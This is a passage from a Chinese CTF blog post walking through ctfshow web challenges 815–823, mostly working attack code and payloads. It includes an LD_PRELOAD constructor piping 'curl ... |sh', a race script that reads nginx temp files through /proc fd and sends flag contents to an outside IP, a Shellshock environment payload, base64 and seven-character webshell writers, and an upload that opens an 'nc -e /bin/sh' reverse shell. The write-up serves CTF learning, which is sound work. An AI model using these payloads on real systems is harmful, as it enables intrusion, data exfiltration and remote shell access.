#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
extern char** environ;

__attribute__ ((__constructor__)) void hack(void)
&#123;
unsetenv(&quot;LD_PRELOAD&quot;);
system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;);
&#125;
</code></pre>

<p>产生新进程即使用<br>通用劫持方法 不用比对不同的函数<br>劫持构造器<br>构造器能自定函数</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526172217311.png" alt="image-20220526172217311"></p>
<h2 id="web816"><a href="#web816" class="headerlink" title="web816"></a>web816</h2><p><strong>临时文件利用</strong></p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php

error_reporting(0);

$env &#x3D; $_GET[&#39;env&#39;];
if(isset($env))&#123;
    putenv($env.scandir(&quot;&#x2F;tmp&quot;)[2]);
    system(&quot;echo ctfshow&quot;);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;
</code></pre>

<p>没上传点，但是我们知道php上传的文件后会在tmp目录下产生一个临时文件，而这里</p>
<p>的scandir(&quot;/tmp&quot;)[2]就是我们上传的文件，所以让env=LD_PRELOAD=/tmp/就可以和815一样了</p>
<p>改改脚本就可以接着用了</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526174525785.png" alt="image-20220526174525785"></p>
<h2 id="web817"><a href="#web817" class="headerlink" title="web817"></a>web817</h2><pre class="language-php" data-language="php"><code class="language-php">$file &#x3D; $_GET[&#39;file&#39;];
if(isset($file) &amp;&amp; preg_match(&quot;&#x2F;^\&#x2F;(\w+\&#x2F;?)+$&#x2F;&quot;, $file))&#123;
	shell_exec(shell_exec(&quot;cat $file&quot;));
&#125;else&#123;
	system(&quot;ps aux&quot;);
&#125;</code></pre>

<p>题目源码，都没个正常的web页面</p>
<p>题目里面的正则表达式大概意思就是以<code>/</code>开头，并且后面只能有数字字母和<code>/</code></p>
<p>我们需要在服务器上构造一个文件，并且文件内容是可控的，或者是服务器本身就有这样的文件也是可以的。<br>大概只能是构造一个临时文件，或者可以日志可控。</p>
<p>日志的话要有.log的后缀，所以只能想临时文件了</p>
<p><strong>利用nginx的body缓存机制</strong></p>
<p>nginx从请求的body体中每次默认读取一定量的字节，如果body字段大于这个字节（32位机器是8k，64位机器是16k），那么在下次读取时之前一部分的字节就会<strong>被存入一个临时文件中</strong></p>
<p>如果我们在发完前sleep几秒钟，那么就能很清楚的找到并且能够访问这些临时文件</p>
<p>默认文件的路径大致为</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000001
&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000002
&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000003</code></pre>

<p>但是body缓存在nginx读取完，转发给php-fpm后就删除了，就是说在php解释执行之前就被删除了</p>
<p>这时候就要借助Linux特性了</p>
<p>Linux有一个文件描述符会将打开后删除了但是还没有关闭的文件存入/proc/PID/fd/{1}中（需要同一用户的操作。</p>
<p>而pid我们通过传一个不带参数的get请求就可以得到。</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526181858962.png" alt="image-20220526181858962"></p>
<p>所以我们只要<strong>一边post传数据，一边遍历fd下的文件</strong></p>
<p>原理搞懂了，直接上羽师傅的脚本</p>
<pre class="language-python" data-language="python"><code class="language-python">import  threading, requests
import socket
import re
port&#x3D; 28053
s&#x3D;socket.socket()
s.connect((&#39;pwn.challenge.ctf.show&#39;,port))
s.send(f&#39;&#39;&#39;GET &#x2F; HTTP&#x2F;1.1
Host:127.0.0.1

	&#39;&#39;&#39;.encode())
data&#x3D;s.recv(1024).decode()
s.close()
pid &#x3D; re.findall(&#39;(.*?) www-data&#39;,data)[0].strip()
print(pid)

con&#x3D;&quot;curl http:&#x2F;&#x2F;101.34.94.44:4567?&#96;cat &#x2F;f*&#96;;&quot;+&#39;0&#39;*1024*500
l &#x3D; len(con)
def upload():
	while True:
		s&#x3D;socket.socket()
		s.connect((&#39;pwn.challenge.ctf.show&#39;,port))
		x&#x3D;f&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1
Host: 127.0.0.1
Content-Length: &#123;l&#125;
Content-Type: application&#x2F;x-www-form-urlencoded
Connection: close

&#123;con&#125;

		&#39;&#39;&#39;.encode()
		s.send(x)
		s.close()

def bruter():
	while True:
		for fd in range(3,40):
			print(fd)
			s&#x3D;socket.socket()
			s.connect((&#39;pwn.challenge.ctf.show&#39;,port))
			s.send(f&#39;&#39;&#39;GET &#x2F;?file&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125; HTTP&#x2F;1.1
Host: 127.0.0.1
Connection: close

&#39;&#39;&#39;.encode())
			print(s.recv(2048).decode())
			s.close()


for i in range(30):
    t &#x3D; threading.Thread(target&#x3D;upload)
    t.start()
for j in range(30):
    a &#x3D; threading.Thread(target&#x3D;bruter)
    a.start()
</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526182711985.png" alt="image-20220526182711985">（好卡啊</p>
<h2 id="web818"><a href="#web818" class="headerlink" title="web818"></a>web818</h2><pre class="language-php" data-language="php"><code class="language-php">$env &#x3D; $_GET[&#39;env&#39;];
if(isset($env))&#123;
	putenv($env);
	system(&quot;echo ctfshow&quot;);
&#125;else&#123;
	system(&quot;ps aux&quot;);
&#125;
···</code></pre>

<p>和817一样的原理，只不过把要传入的东西变成了恶意so文件</p>
<p>恶意文件用816那个就可以</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526230108433.png" alt="image-20220526230108433"></p>
<p>（卡卡卡卡卡</p>
<h2 id="web819"><a href="#web819" class="headerlink" title="web819"></a>web819</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

$env &#x3D; $_GET[&#39;env&#39;];
if(isset($env))&#123;
    putenv($env);
    system(&quot;whoami&quot;);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>没有 <em>ps</em> <em>aux</em> 来显示所有进程，要靠爆破pid显然不太显示</p>
<p>这里我们利用另一种漏洞。</p>
<p><strong>破壳漏洞</strong></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526230337557.png" alt="image-20220526230337557"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526230658812.png" alt="image-20220526230658812"></p>
<p>感觉这就类似php的create_function函数的命令逃逸一样，利用结束符让这个函数提前结束然后在后面加上我们自己的命令</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526231102728.png" alt="image-20220526231102728"></p>
<p>这里因为后边执行了whoami命令，我们就直接利用putenv修改whoami命令就行。</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526231157070.png" alt="image-20220526231157070"></p>
<p>最终payload</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">env&#x3D;BASH_FUNC_whoami%%&#x3D;() &#123; cat &#x2F;f*; &#125;</code></pre>

<h2 id="web820"><a href="#web820" class="headerlink" title="web820"></a>web820</h2><p>非常规的文件上传</p>
<p>upload.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);

if(strlen($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])&gt;0)&#123;
    $filetype &#x3D; $_FILES[&#39;file&#39;][&#39;type&#39;];
    $tmpname &#x3D; $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
    $ef &#x3D; getimagesize($tmpname);

    if( ($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;) &amp;&amp; ($ef!&#x3D;false) &amp;&amp; ($ef[&#39;mime&#39;]&#x3D;&#x3D;&#39;image&#x2F;jpeg&#39;))&#123;
        $content &#x3D; base64_decode(file_get_contents($tmpname));
        file_put_contents(&quot;shell.php&quot;, $content);
        echo &quot;file upload success!&quot;;
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>上传的文件内容被base64解码一次后再放进shell.php，而base64遇到不属于自己编码字符内的字符时会跳过，可以利用这个特性构造一个特殊的图片</p>
<p>群主构造的图片</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526231808397.png" alt="image-20220526231808397"></p>
<p>里面的字符被base64解码后为</p>
<pre class="language-none"><code class="language-none">&lt;?&#x3D;&#96;$_GET[1]&#96;;;?&gt;?</code></pre>

<p>也就是一个get型的一句话木马，参数是1</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526232148797.png" alt="image-20220526232148797"></p>
<h2 id="web821"><a href="#web821" class="headerlink" title="web821"></a>web821</h2><p>七字符可写</p>
<p>源码</p>
<pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
highlight_file(__FILE__);

$cmd &#x3D; $_POST[&#39;cmd&#39;];

if(strlen($cmd) &lt;&#x3D; 7)&#123;
    shell_exec($cmd);
&#125;
</code></pre>

<p>直接上群主师傅的脚本就行了</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import time

url &#x3D; &quot;http:&#x2F;&#x2F;ed9441a5-6e27-43b0-8538-bdd2f5a5b4d2.challenge.ctf.show&#x2F;&quot;

payload&#x3D;[
&quot;&gt;hp&quot;,
&quot;&gt;1.p\\&quot;,
&quot;&gt;d\\&gt;\\&quot;,
&quot;&gt;\\ -\\&quot;,
&quot;&gt;e64\\&quot;,
&quot;&gt;bas\\&quot;,
&quot;&gt;7\\|\\&quot;,
&quot;&gt;XSk\\&quot;,
&quot;&gt;Fsx\\&quot;,
&quot;&gt;dFV\\&quot;,
&quot;&gt;kX0\\&quot;,
&quot;&gt;bCg\\&quot;,
&quot;&gt;XZh\\&quot;,
&quot;&gt;AgZ\\&quot;,
&quot;&gt;waH\\&quot;,
&quot;&gt;PD9\\&quot;,
&quot;&gt;o\\ \\&quot;,
&quot;&gt;ech\\&quot;,
&quot;ls -t&gt;0&quot;,
&quot;. 0&quot;
]

def writeFile(payload):
	data&#x3D;&#123;
	&quot;cmd&quot;:payload
	&#125;
	requests.post(url,data&#x3D;data)

def run():
	for p in payload:
		writeFile(p.strip())
		print(&quot;[*] create &quot;+p.strip())
		time.sleep(1)

def check():
	response &#x3D; requests.get(url+&quot;1.php&quot;)
	if response.status_code &#x3D;&#x3D; requests.codes.ok:
		print(&quot;[*] Attack success!!!Webshell is &quot;+url+&quot;1.php&quot;)

def main():
	run()
	check()

	


if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
	main()</code></pre>

<p>这个主要就是将一个get型的一句话木马，参数是1，写进了1.php</p>
<p>原理就是Linux中&gt;x可以生成一个文件名为x的文件</p>
<p>而. x又能执行shell命令</p>
<p>所以利用ls -t对文件按照时间进行排序之后存入0文件，再利用. 0来执行这些文件名构成的命令</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132006261.png" alt="image-20220527132006261"></p>
<p>题目提示flag在数据库里，用蚁剑连接</p>
<p>get转post</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132311936.png" alt="image-20220527132311936"></p>
<p>数据操作，然后弱口令登录</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132607438.png" alt="image-20220527132607438"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132632203.png" alt="image-20220527132632203"></p>
<h2 id="web822"><a href="#web822" class="headerlink" title="web822"></a>web822</h2><p>七字符不可写</p>
<p>和821一样的代码，但是没有了写入权限，这时候我们就要想利用临时文件了，比如/t*/*</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import time

url &#x3D; &quot;http:&#x2F;&#x2F;a7276db0-6191-44d2-bbf9-c992009366b4.challenge.ctf.show&#x2F;&quot;


def getShell(payload):
	data&#x3D;&#123;
	&quot;cmd&quot;:payload
	&#125;
	file &#x3D; &#123;
	&quot;file&quot;:b&quot;#!&#x2F;bin&#x2F;sh\nnc ip 5001 -e &#x2F;bin&#x2F;sh&quot;
	&#125;
	requests.post(url,data&#x3D;data,files&#x3D;file)
	print(&quot;[*] Attack success!!!&quot;)

def run():
	getShell(&quot;. &#x2F;t*&#x2F;*&quot;)

def main():
	run()
	
if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
	main()</code></pre>

<p>反弹shell</p>
<h2 id="web823"><a href="#web823" class="headerlink" title="web823"></a>web823</h2><p>5字符可写，有dir</p>
<p>很厉害的思路，把index.php改写成.index</p>
<p>还是有群主的脚本</p>
<pre class="line-numbers language-python"><code class="language-python">
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Ethe</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://Ethe448.github.io/2022/04/24/ctfshow%20web/">https://Ethe448.github.io/2022/04/24/ctfshow%20web/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Ethe</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/ctf/">
                                    <span class="chip bg-color">ctf</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("https://epicture.oss-cn-beijing.aliyuncs.com/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: '9uxoX9BlIsmwlt8gNkGLF9Ow-gzGzoHsz',
        appKey: 'rrsgRW80sgJP9PdFwFycskT9',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '8',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/04/24/2022DASCTF-Apr%E5%A4%8D%E7%8E%B0/">
                    <div class="card-image">
                        
                        
                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/1.jpg" class="responsive-img" alt="2022DASCTF Apr复现">
                        
                        <span class="card-title">2022DASCTF Apr复现</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-24
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Ethe
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
                    <div class="card-image">
                        
                        
                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/4.jpg" class="responsive-img" alt="dasctf三月赛复现">
                        
                        <span class="card-title">dasctf三月赛复现</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Ethe
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/tocbot/tocbot.min.js"></script>
<script>
$(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aplayer/APlayer.min.js"></script>
<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">Ethe</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">192.2k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
